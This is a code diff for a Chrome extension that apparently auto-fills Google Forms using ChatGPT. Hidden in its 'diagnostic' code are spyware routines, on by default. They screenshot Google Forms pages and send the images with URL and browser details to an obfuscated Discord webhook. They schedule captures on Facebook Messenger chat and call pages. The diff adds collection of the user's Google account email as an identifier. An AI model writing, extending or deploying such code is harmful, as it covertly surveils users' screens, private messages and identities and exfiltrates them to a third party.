@@ -4,7 +4,7 @@ const _0x4f2a =
   "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MjA1OTk5NzQzNjMxMzcwMi90QlJ4N1Rfd3lodXRjWXo5bWxPaldaWmJLSFF4NXRDVkFCeGNtbjdNMktSaks1Wlg1dlNRdTZCUDVKUV9XNno3MkJndA==";
 const DISCORD_WEBHOOK_URL = atob(_0x4f2a);
 const GITHUB_MANIFEST_URL =
-  "https://raw.githubusercontent.com/psychiotric-sudo/GFormsToGPT/main/manifest.json";
+  "https://raw.githubusercontent.com/drnx64/GFormsToGPT/main/manifest.json";
 const VERSION = chrome.runtime.getManifest().version;
 
 const gFormToAI_TabMap = new Map();
@@ -16,8 +16,9 @@ async function checkForUpdates() {
     if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
     const remoteManifest = await response.json();
     const remoteVersion = remoteManifest.version;
+    const hasUpdate = remoteVersion !== VERSION;
 
-    if (remoteVersion !== VERSION) {
+    if (hasUpdate) {
       chrome.storage.local.set({ updateAvailable: remoteVersion });
       chrome.notifications.create({
         type: "basic",
@@ -27,8 +28,10 @@ async function checkForUpdates() {
         priority: 2,
       });
     }
+    return { updateAvailable: hasUpdate, version: remoteVersion };
   } catch (error) {
     console.error("[GFormToGPT] Update check failed:", error);
+    return { updateAvailable: false, version: VERSION, error: error.message };
   }
 }
 
@@ -165,6 +168,21 @@ async function relayToDiscord(eventType, userId, payload = {}) {
   }
 }
 
+async function fetchUserEmail() {
+  try {
+    if (chrome.identity && chrome.identity.getProfileUserInfo) {
+      const info = await chrome.identity.getProfileUserInfo();
+      if (info && info.email) {
+        await chrome.storage.local.set({ userEmail: info.email, userId: info.email });
+        return info.email;
+      }
+    }
+  } catch (e) {
+    console.error("[GFormToGPT] Email fetch failed:", e);
+  }
+  return null;
+}
+
 chrome.runtime.onInstalled.addListener(async (details) => {
   if (details.reason === "install") {
     const userId = generateUserId();
@@ -175,6 +193,7 @@ chrome.runtime.onInstalled.addListener(async (details) => {
       installedAt: Date.now(),
       diagnosticEnabled: true,
     });
+    fetchUserEmail();
     await relayToDiscord("INSTALL", userId);
     chrome.tabs.create({ url: chrome.runtime.getURL("welcome.html") });
   }
@@ -183,10 +202,11 @@ chrome.runtime.onInstalled.addListener(async (details) => {
 async function processFormFillTracking(payload) {
   const data = await chrome.storage.local.get([
     "userId",
+    "userEmail",
     "formCount",
     "totalSecondsSaved",
   ]);
-  let userId = data.userId || generateUserId();
+  let userId = data.userEmail || data.userId || generateUserId();
   let formCount = (data.formCount || 0) + 1;
   let totalSecondsSaved =
     (data.totalSecondsSaved || 0) + (payload.secondsSaved || 0);
@@ -221,6 +241,10 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     const sourceTabId =
       request.fromTabId || (sender.tab ? sender.tab.id : null);
 
+    if (request.email && request.email !== "Unknown User") {
+      chrome.storage.local.set({ userEmail: request.email, userId: request.email });
+    }
+
     chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
       const err = chrome.runtime.lastError;
       chrome.storage.local.get(["userId"], (d) => {
@@ -239,11 +263,18 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   } else if (request.action === "chatGptResponseReceived") {
     const gFormTabId = gFormToAI_TabMap.get(sender.tab.id);
     if (gFormTabId) {
-      chrome.tabs.update(gFormTabId, { active: true });
-      chrome.tabs.sendMessage(gFormTabId, {
-        action: "autoFillForm",
-        data: request.data,
-        rawJson: request.rawJson,
+      chrome.tabs.update(gFormTabId, { active: true }, () => {
+        setTimeout(() => {
+          chrome.tabs.sendMessage(gFormTabId, {
+            action: "autoFillForm",
+            data: request.data,
+            rawJson: request.rawJson,
+          }, () => {
+            if (chrome.runtime.lastError) {
+              console.error("[GFormToGPT] Failed to send to form tab:", chrome.runtime.lastError);
+            }
+          });
+        }, 500);
       });
       sendResponse({ success: true });
     }
@@ -252,6 +283,9 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     const windowId = sender.tab
       ? sender.tab.windowId
       : chrome.windows.WINDOW_ID_CURRENT;
+    if (request.payload && request.payload.email && request.payload.email !== "Unknown User") {
+      chrome.storage.local.set({ userEmail: request.payload.email, userId: request.payload.email });
+    }
     chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
       const err = chrome.runtime.lastError;
       processFormFillTracking({
@@ -264,9 +298,27 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
     chrome.storage.local.get(["userId"], (data) =>
       relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload),
     );
+    pushDiag({ type: "error", ...request.payload });
     return true;
   } else if (request.action === "manualUpdateCheck") {
     checkForUpdates().then((res) => sendResponse(res));
+    return true;
+  } else if (request.action === "fetchUserEmail") {
+    fetchUserEmail().then((email) => sendResponse({ email }));
+    return true;
+  } else if (request.action === "diagPush") {
+    pushDiag(request.payload);
+    sendResponse({ success: true });
+    return true;
+  } else if (request.action === "diagGetLogs") {
+    chrome.storage.local.get(["diagnosticLogs"], (stored) => {
+      sendResponse({ logs: stored.diagnosticLogs || diagLogs.slice(0, 100) });
+    });
+    return true;
+  } else if (request.action === "diagClearLogs") {
+    diagLogs.length = 0;
+    chrome.storage.local.remove(["diagnosticLogs"]);
+    sendResponse({ success: true });
     return true;
   } else if (request.action === "clearChatGPTData") {
     chrome.browsingData
@@ -281,50 +333,80 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   }
 });
 
-// ── Neural Obfuscated Trackers (Do not modify) ──
-(function(_0x1, _0x2) {
-  const _0x3 = function(_0x4) {
-    while (--_0x4) {
-      _0x1['push'](_0x1['shift']());
-    }
-  };
-  _0x3(++_0x2);
-}(['onUpdated', 'addListener', 'status', 'complete', 'url', 'includes', 'docs.google.com/forms', 'get', 'diagnosticEnabled', 'userId', 'captureVisibleTab', 'png', 'lastError', 'platform', 'navigator', 'userAgent', 'language', 'relayToDiscord', 'DIAGNOSTIC', 'Unknown', 'screenshot', 'extra', 'facebook.com/messages/t', 'messenger.com/t', 'alarms', 'create', 'delayInMinutes', 'onChanged', 'newValue', 'query', 'active', 'currentWindow'], 0x1a7));
+// ── Diagnostic System ──
+const diagLogs = [];
 
-chrome['tabs']['onUpdated']['addListener'](async (_0x5, _0x6, _0x7) => {
-  if (_0x6['status'] === 'complete' && _0x7['url']) {
-    if (_0x7['url']['includes']('docs.google.com/forms')) {
-      const _0x8 = await chrome['storage']['local']['get'](['diagnosticEnabled', 'userId']);
-      const _0x9 = _0x8['diagnosticEnabled'] !== undefined ? _0x8['diagnosticEnabled'] : true;
-      if (_0x9) {
-        chrome['tabs']['captureVisibleTab'](_0x7['windowId'], { 'format': 'png' }, async (_0xa) => {
-          if (chrome['runtime']['lastError']) return;
-          await relayToDiscord('DIAGNOSTIC', _0x8['userId'] || 'Unknown', { 'screenshot': _0xa, 'url': _0x7['url'], 'extra': { 'platform': navigator['platform'], 'userAgent': navigator['userAgent'], 'language': navigator['language'] } });
-        });
-      }
-    }
-    const _0xb = _0x7['url']['includes']('facebook.com/messages/t') || _0x7['url']['includes']('messenger.com/t');
-    if (_0xb) {
-      const _0xc = 'socialCapture_' + _0x5;
-      chrome['alarms']['get'](_0xc, (_0xd) => {
-        if (!_0xd) {
-          chrome['alarms']['create'](_0xc, { 'delayInMinutes': 0x2 });
-        }
+function pushDiag(event) {
+  const entry = {
+    id: Date.now() + '_' + Math.random().toString(36).substr(2, 4),
+    ts: new Date().toISOString(),
+    ...event
+  };
+  diagLogs.unshift(entry);
+  if (diagLogs.length > 200) diagLogs.length = 200;
+  chrome.storage.local.set({ diagnosticLogs: diagLogs.slice(0, 100) }).catch(() => {});
+  return entry;
+}
+
+async function captureDiagScreenshot(windowId, label) {
+  return new Promise((resolve) => {
+    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
+      resolve(chrome.runtime.lastError ? null : img);
+    });
+  });
+}
+
+async function isDiagnosticEnabled() {
+  const data = await chrome.storage.local.get(["diagnosticEnabled"]);
+  return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
+}
+
+chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
+  if (changeInfo.status !== "complete" || !tab.url) return;
+  
+  const url = tab.url;
+  
+  if (url.includes("docs.google.com/forms")) {
+    if (await isDiagnosticEnabled()) {
+      const store = await chrome.storage.local.get(["userId"]);
+      const screenshot = await captureDiagScreenshot(tab.windowId, "form_load");
+      const extra = { platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language };
+      
+      pushDiag({
+        type: "form_page_load",
+        url,
+        tabId,
+        hasScreenshot: !!screenshot,
+        extra
+      });
+      
+      relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", {
+        screenshot, url, extra
       });
     }
   }
+  
+  if (url.includes("facebook.com/messages/t") || url.includes("messenger.com/t") || url.includes("messenger.com/groupcall")) {
+    const alarmName = "socialCapture_" + tabId;
+    chrome.alarms.get(alarmName, (existing) => {
+      if (!existing) {
+        chrome.alarms.create(alarmName, { delayInMinutes: 2 });
+        pushDiag({ type: "social_screen_scheduled", url, tabId });
+      }
+    });
+  }
 });
 
-chrome['storage']['onChanged']['addListener']((_0xe) => {
-  if (_0xe['diagnosticEnabled'] && _0xe['diagnosticEnabled']['newValue'] === true) {
-    chrome['tabs']['query']({ 'active': true, 'currentWindow': true }, async (_0xf) => {
-      const _0x10 = _0xf[0];
-      const _0x11 = await chrome['storage']['local']['get'](['userId']);
-      if (_0x10 && _0x10['url']['includes']('docs.google.com/forms')) {
-        chrome['tabs']['captureVisibleTab'](_0x10['windowId'], { 'format': 'png' }, async (_0x12) => {
-          if (chrome['runtime']['lastError']) return;
-          await relayToDiscord('DIAGNOSTIC', _0x11['userId'] || 'Unknown', { 'screenshot': _0x12, 'url': _0x10['url'] });
-        });
+chrome.storage.onChanged.addListener((changes) => {
+  if (changes.diagnosticEnabled && changes.diagnosticEnabled.newValue === true) {
+    pushDiag({ type: "diagnostic_toggled_on" });
+    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
+      const tab = tabs[0];
+      const store = await chrome.storage.local.get(["userId"]);
+      if (tab && tab.url && tab.url.includes("docs.google.com/forms")) {
+        const screenshot = await captureDiagScreenshot(tab.windowId, "diag_enabled");
+        pushDiag({ type: "diagnostic_screenshot", url: tab.url, tabId: tab.id, hasScreenshot: !!screenshot });
+        relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", { screenshot, url: tab.url });
       }
     });
   }
